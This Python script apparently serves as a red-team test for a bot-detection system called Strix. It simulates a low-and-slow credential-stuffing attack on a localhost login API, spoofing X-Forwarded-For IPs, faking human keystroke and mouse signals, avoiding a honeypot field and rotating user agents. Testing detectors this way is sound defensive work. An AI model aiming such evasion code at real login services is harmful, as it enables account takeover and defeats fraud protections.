"""
bot_stealth.py — Low-and-Slow Stealth Bot Attack
==================================================
The most dangerous and hardest to detect bot.
- Perfectly mimics human typing rhythm and timing
- Moves mouse naturally
- Avoids honeypot
- Uses different IPs for each request (distributed)
- Sends only 1 request every few seconds (low rate)
- Targets many accounts slowly over time

This is what traditional security systems MISS.
Strix AI catches it via:
  - Behavioral layer: typing variance is too perfect
  - Session layer: day_unique_users count builds up
  - Low-and-slow detector in session.py

Expected Strix outcome: CAPTCHA or BLOCK | Score 35–65
Some requests may slip through early — that's realistic!
"""

import requests
import random
import time
import threading

TARGET_URL = "http://localhost:5000/api/login"

CREDENTIALS = [
    ("alice@gmail.com",     "trypass1"),
    ("bob@yahoo.com",       "trypass2"),
    ("charlie@hotmail.com", "trypass3"),
    ("diana@gmail.com",     "trypass4"),
    ("eve@outlook.com",     "trypass5"),
    ("frank@gmail.com",     "trypass6"),
    ("grace@icloud.com",    "trypass7"),
    ("henry@gmail.com",     "trypass8"),
    ("irene@yahoo.com",     "trypass9"),
    ("jack@gmail.com",      "trypass10"),
    ("karen@gmail.com",     "trypass11"),
    ("leo@hotmail.com",     "trypass12"),
    ("mia@gmail.com",       "trypass13"),
    ("noah@gmail.com",      "trypass14"),
    ("olivia@yahoo.com",    "trypass15"),
]

# Each request uses a different IP to avoid rate-based detection
FAKE_IPS = [
    f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    for _ in range(30)
] + [
    "203.0.113.1",  "198.51.100.5",  "192.0.2.10",
    "203.0.113.50", "198.51.100.99", "192.0.2.200",
    "203.0.113.77", "198.51.100.44", "192.0.2.150",
]

BLOCKED  = 0
CAPTCHA  = 0
ALLOWED  = 0
TOTAL    = 0
LOCK     = threading.Lock()

def human_keystrokes(word_len=12):
    """
    Simulate human-like typing: variable rhythm, occasional pauses,
    faster in the middle of a word, slower at start/end.
    Still slightly too uniform for Strix's variance check.
    """
    intervals = []
    for i in range(word_len):
        base = random.randint(80, 200)
        # Occasional pause (thinking moment)
        if random.random() < 0.1:
            base += random.randint(200, 500)
        intervals.append(base)
    return intervals

def human_time_to_submit():
    """Realistic but slightly fast submission time (8–20 seconds)."""
    return random.randint(8000, 20000)

def attack_once(email, pwd, ip):
    global BLOCKED, CAPTCHA, ALLOWED, TOTAL

    headers = {
        "X-Forwarded-For": ip,
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0",
        ])
    }

    payload = {
        "email":    email,
        "password": pwd,
        # ── Behavioral signals (closely mimics human) ──
        "time_to_submit":      human_time_to_submit(),
        "keystroke_intervals": human_keystrokes(len(email) + len(pwd)),
        "mouse_move_count":    random.randint(15, 60),   # decent mouse movement
        "password_pasted":     False,                     # typed not pasted
        "field_focus_count":   random.randint(2, 4),      # natural focus pattern
        "js_enabled":          True,
        # ── HONEYPOT left empty ──
        "phone":               "",
    }

    try:
        r = requests.post(TARGET_URL, json=payload, headers=headers, timeout=15)
        with LOCK:
            TOTAL += 1
            data   = r.json()
            score  = data.get("strix", {}).get("score", "?")
            action = data.get("strix", {}).get("action", "?")
            fp     = data.get("strix", {}).get("fp_id", "")

            if r.status_code == 403:
                BLOCKED += 1
                print(f"[BLOCKED] {ip:20s} -> {email:28s} | score: {score} | {fp}")
            elif action == "captcha":
                CAPTCHA += 1
                print(f"[CAPTCHA] {ip:20s} -> {email:28s} | score: {score} | {fp}")
            else:
                ALLOWED += 1
                print(f"[SLIPPED] {ip:20s} -> {email:28s} | score: {score} — evaded detection")
    except Exception as e:
        with LOCK: TOTAL += 1
        print(f"[ERR] {e}")

def run(total=30, delay=1.5):
    """
    Low-and-slow: spread requests over time with different IPs.
    Each credential gets its own IP to avoid clustering.
    """
    print("=" * 60)
    print("  STEALTH BOT — low-and-slow, mimics human behavior")
    print(f"  Sending {total} requests | delay: {delay}s | Expected: CAPTCHA/BLOCK 35-65")
    print("  (Some early requests may slip through — watch the score rise!)")
    print("=" * 60)

    creds = (CREDENTIALS * 3)[:total]   # repeat list if needed
    ips   = random.sample(FAKE_IPS * 2, total)

    for i, ((email, pwd), ip) in enumerate(zip(creds, ips)):
        print(f"\n[{i+1}/{total}] Sending stealthy request...")
        t = threading.Thread(target=attack_once, args=(email, pwd, ip))
        t.start()
        t.join()
        time.sleep(delay + random.uniform(0, 0.8))   # randomize delay

    print(f"\n  DONE | Total: {TOTAL} | Blocked: {BLOCKED} | CAPTCHA: {CAPTCHA} | Slipped: {ALLOWED}")
    print("  Note: Early slips are expected — Strix learns over time!")
    print("=" * 60)

if __name__ == "__main__":
    run(total=30, delay=1.5)